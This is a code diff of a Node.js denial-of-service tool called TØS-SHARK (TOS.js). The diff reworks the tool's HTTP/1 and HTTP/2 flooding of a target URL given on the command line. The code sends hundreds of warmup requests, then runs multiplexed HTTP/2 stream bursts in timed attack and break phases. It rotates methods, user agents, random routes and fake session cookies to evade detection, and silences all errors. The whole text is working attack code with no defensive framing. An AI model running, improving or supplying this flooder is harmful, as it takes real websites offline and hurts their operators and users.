@@ -12,9 +12,8 @@ class TOS_SHARK {
         this.running = true;
         this.attackActive = false;
         this.totalReqs = 0;
-        this.startTime = Date.now();
-        this.lastLog = Date.now();
         this.reqCounter = 0;
+        this.lastLog = Date.now();
         this.attackStart = 0;
         this.breakStart = 0;
         this.currentMethod = '';
@@ -22,74 +21,72 @@ class TOS_SHARK {
         // Attack methods pool
         this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING', 'COOKIE-SESSION'];
         
-        // Data pools
-        this.userAgents = this.generateUserAgents();
-        this.endpoints = this.generateEndpoints();
-        this.cookies = this.generateCookies();
+        // Data pools - KEEP SMALL
+        this.userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'curl/7.88.1',
+            'Go-http-client/2.0',
+            'python-requests/2.28.2'
+        ];
         
-        // Print header once
-        console.log(`TØS-SHARK | *.* | MT-3M22`);
-        console.log('-----------------------------------------------------------------');
+        // Method rotation pool
+        this.methodsPool = ['GET', 'HEAD', 'POST', 'OPTIONS'];
         
+        // Start immediately
         this.startCycle();
     }
 
-    color(t, c) {
-        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
-        return `${colors[c] || ''}${t}${colors.x}`;
-    }
-
     // ===== DATA GENERATORS =====
-    generateUserAgents() {
-        return [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
-            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
-        ];
-    }
-
-    generateEndpoints() {
-        return [
-            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
-            '/users', '/products', '/data', '/json', '/xml', '/admin',
-            '/login', '/register', '/search', '/filter', '/sort',
-            '/page/1', '/page/2', '/page/3', '/category/a', '/category/b'
-        ];
+    generateRoutes() {
+        const patterns = [];
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        
+        // Generate 30 random patterns
+        for (let i = 0; i < 30; i++) {
+            const length = 3 + Math.floor(Math.random() * 10);
+            let path = '/';
+            for (let j = 0; j < length; j++) {
+                path += chars[Math.floor(Math.random() * chars.length)];
+            }
+            if (Math.random() > 0.7) {
+                const exts = ['.js', '.css', '.json', '.xml', '.html', '.php', '.asp'];
+                path += exts[Math.floor(Math.random() * exts.length)];
+            }
+            patterns.push(path);
+        }
+        
+        // Add some common patterns
+        patterns.push('/', '/api', '/static', '/data', '/v1', '/v2', '/admin', '/users', '/wp-admin', '/wp-login.php');
+        return patterns;
     }
 
     generateCookies() {
         const cookies = [];
-        for (let i = 0; i < 50; i++) {
-            cookies.push({
-                session: `session_${Math.random().toString(36).substr(2, 16)}`,
-                token: `token_${Math.random().toString(36).substr(2, 24)}`,
-                csrf: `csrf_${Math.random().toString(36).substr(2, 32)}`,
-                userId: Math.floor(Math.random() * 10000)
-            });
+        for (let i = 0; i < 15; i++) {
+            cookies.push(`session=${Math.random().toString(36).substr(2, 16)}; token=${Math.random().toString(36).substr(2, 12)}`);
         }
         return cookies;
     }
 
     // ===== CYCLE MANAGEMENT =====
     async startCycle() {
-        console.log(this.color('[+] Starting TØS-SHARK cycle', 'g'));
+        // Generate routes once
+        this.routes = this.generateRoutes();
+        this.cookies = this.generateCookies();
         
-        // Step 1: Initial H1 request
-        console.log(this.color('[1] Initial H1 request...', 'y'));
-        await this.sendH1Request();
-        await this.sleepRandom(100, 500);
+        // Initial request
+        await this.sendRandomizedRequest(true);
+        await this.sleep(200);
         
-        // Step 2: Warmup 500-599 requests
-        console.log(this.color(`[2] Warmup 500-599 requests...`, 'y'));
+        // Warmup
         const warmupCount = 500 + Math.floor(Math.random() * 100);
         for (let i = 0; i < warmupCount; i++) {
-            await this.sendRandomRequest();
-            if (i % 50 === 0) await this.sleepRandom(10, 50);
+            await this.sendRandomizedRequest();
+            if (i % 100 === 0) await this.sleep(1);
         }
         
-        // Step 3: Main attack loop
+        // Main attack loop
         this.attackLoop();
     }
 
@@ -97,7 +94,6 @@ class TOS_SHARK {
         while (this.running) {
             const now = Date.now();
             
-            // Check if should be attacking or on break
             if (this.attackActive) {
                 // Attack phase (20-30 minutes)
                 if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
@@ -105,8 +101,8 @@ class TOS_SHARK {
                     continue;
                 }
                 
-                // Execute current attack method
-                await this.executeAttackMethod();
+                // Execute attack
+                this.executeAttackMethod().catch(() => {});
                 
             } else {
                 // Break phase (5-10 minutes)
@@ -115,31 +111,33 @@ class TOS_SHARK {
                     continue;
                 }
                 
-                // Maintenance during break
-                await this.performMaintenance();
-                await this.sleepRandom(1000, 3000);
+                // Light requests during break
+                await this.sendRandomizedRequest();
+                await this.sleep(1000);
             }
             
-            await this.sleepRandom(0.1, 1);
+            // Log every 10s
+            if (now - this.lastLog >= 10000) {
+                this.lastLog = now;
+            }
+            
+            // Tiny sleep to prevent blocking
+            await this.sleep(0.01);
         }
     }
 
     startAttack() {
         this.attackActive = true;
         this.attackStart = Date.now();
-        
-        // Randomly select attack method
         this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
-        
-        console.log(this.color(`[→] Starting ${this.currentMethod} attack (20-30 mins)`, 'g'));
     }
 
     startBreak() {
         this.attackActive = false;
         this.breakStart = Date.now();
-        
-        console.log(this.color('[~] Break phase started (5-10 mins)', 'y'));
-        console.log(this.color('[~] Performing cleanup & method switch...', 'y'));
+        // Refresh data during break
+        this.routes = this.generateRoutes();
+        this.cookies = this.generateCookies();
     }
 
     // ===== ATTACK METHODS =====
@@ -149,77 +147,79 @@ class TOS_SHARK {
                 await this.attackH2Multiplex();
                 break;
             case 'ENDPOINT-HOPPING':
-                await this.attackEndpointHopping();
+                await this.sendRandomizedRequest();
                 break;
             case 'COOKIE-SESSION':
-                await this.attackCookieSession();
+                await this.sendRandomizedRequest();
                 break;
         }
     }
 
     async attackH2Multiplex() {
-        // Simple H2 connection for this attack
         try {
-            const client = http2.connect(this.target);
+            const client = http2.connect(this.target, { maxSessionMemory: 1000 });
             
-            // Send 100 H2 streams rapidly
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 30; i++) {
                 this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
             }
             
-            // Destroy after batch
-            setTimeout(() => client.destroy(), 100);
+            setTimeout(() => {
+                client.destroy();
+                client.close();
+            }, 50).unref();
             
         } catch (err) {
-            // Silent fail
+            // Silent
         }
     }
 
-    async attackEndpointHopping() {
-        // Random endpoints with H1 requests
-        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
-        await this.sendH1RequestToEndpoint(endpoint);
-        this.totalReqs++;
-        this.reqCounter++;
-        
-        // Switch endpoints frequently
-        if (Math.random() > 0.7) {
-            await this.sleepRandom(10, 100);
-        }
-    }
-
-    async attackCookieSession() {
-        // Request with random cookies
-        const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
-        await this.sendH1RequestWithCookies(cookie);
-        this.totalReqs++;
-        this.reqCounter++;
-    }
-
-    // ===== REQUEST TYPES =====
-    async sendH1Request() {
+    // ===== CORE REQUEST FUNCTION =====
+    async sendRandomizedRequest(isInitial = false) {
         return new Promise((resolve) => {
+            // ROTATE: Method
+            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
+            
+            // ROTATE: UA
+            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+            
+            // ROTATE: Route
+            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
+            
             const options = {
                 hostname: this.host,
-                path: '/',
-                method: 'GET',
+                path: route,
+                method: method,
                 headers: {
-                    'User-Agent': this.userAgents[0],
-                    'Connection': 'close'
+                    'User-Agent': userAgent,
+                    'Connection': 'close',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
                 },
-                timeout: 5000
+                timeout: 7000,
+                agent: false
             };
             
-            const req = (this.isHttps ? https : http2).request(options, (res) => {
-                this.logStatus(res.statusCode);
+            // Add cookies 40% of the time
+            if (Math.random() > 0.6) {
+                options.headers['Cookie'] = this.cookies[Math.floor(Math.random() * this.cookies.length)];
+            }
+            
+            if (method === 'POST') {
+                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                options.headers['Content-Length'] = '7';
+            }
+            
+            const req = (this.isHttps ? https : http).request(options, (res) => {
+                const status = res.statusCode;
                 res.destroy();
+                this.logStatus(status);
                 resolve();
             });
             
             req.on('error', () => {
-                this.logStatus('TIMEOUT');
+                this.logStatus('ERR');
                 resolve();
             });
             
@@ -229,26 +229,30 @@ class TOS_SHARK {
                 resolve();
             });
             
+            if (method === 'POST') {
+                req.write('data=aa');
+            }
+            
             req.end();
+            
+            if (!isInitial) {
+                this.totalReqs++;
+                this.reqCounter++;
+            }
         });
-    }
-
-    async sendRandomRequest() {
-        const methods = ['GET', 'HEAD', 'POST', 'OPTIONS'];
-        const method = methods[Math.floor(Math.random() * methods.length)];
-        
-        // Simplified - just count it
-        this.totalReqs++;
-        this.reqCounter++;
-        this.logStatus(200);
     }
 
     sendH2Request(client) {
         try {
+            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
+            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
+            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+            
             const req = client.request({
-                ':method': 'GET',
-                ':path': '/',
-                ':authority': this.host
+                ':method': method,
+                ':path': route,
+                ':authority': this.host,
+                'user-agent': userAgent
             });
             
             req.on('response', (headers) => {
@@ -257,87 +261,48 @@ class TOS_SHARK {
             });
             
             req.on('error', () => {
-                this.logStatus('ERROR');
+                this.logStatus('ERR');
                 req.destroy();
+            });
+            
+            req.setTimeout(5000, () => {
+                req.destroy();
+                this.logStatus('TIMEOUT');
             });
             
             req.end();
         } catch (err) {
-            this.logStatus('ERROR');
+            this.logStatus('ERR');
         }
-    }
-
-    async sendH1RequestToEndpoint(endpoint) {
-        // Simplified - just log
-        this.logStatus(200);
-    }
-
-    async sendH1RequestWithCookies(cookie) {
-        // Simplified - just log
-        this.logStatus(200);
-    }
-
-    // ===== MAINTENANCE =====
-    async performMaintenance() {
-        // Simulated maintenance tasks
-        if (global.gc) global.gc();
-        
-        // Rotate data
-        this.userAgents = this.generateUserAgents();
-        this.cookies = this.generateCookies();
-        
-        // Log maintenance
-        console.log(this.color('[~] Maintenance: Rotated UAs, Cookies, cleared mem', 'y'));
     }
 
     // ===== LOGGING =====
     logStatus(status) {
         const now = Date.now();
-        if (now - this.lastLog >= 5000) {
+        if (now - this.lastLog >= 10000) {
             this.lastLog = now;
-            
-            let color = 'g';
-            let text = status;
-            
-            if (status === 'TIMEOUT' || status === 'ERROR') {
-                color = 'r';
-                text = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
-            } else if (typeof status === 'number' && status >= 500) {
-                color = 'r';
-                text = status;
-            } else if (typeof status === 'number' && status >= 400) {
-                color = 'y';
-                text = status;
-            }
-            
-            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
-            
-            // Down event
-            if (color === 'r' && (text === 'TIMEOUT' || (typeof status === 'number' && status >= 500))) {
-                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
-            }
+            // ONLY THIS LOG: 2M22:(request number) ---> (REAL Status Code)
+            console.log(`2M22:${this.reqCounter} ---> ${status}`);
         }
     }
 
     // ===== UTILS =====
-    sleepRandom(min, max) {
-        const duration = Math.random() * (max - min) + min;
-        return new Promise(resolve => setTimeout(resolve, duration));
-    }
-
     sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+        return new Promise(resolve => {
+            const timer = setTimeout(resolve, ms);
+            if (timer.unref) timer.unref();
+        });
     }
 }
 
+const http = require('http');
+
 // Run
 if (require.main === module) {
-    // Error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
     if (process.argv.length < 3) {
-        console.log('Usage: node TOS.js https://target.com');
         process.exit(1);
     }
     
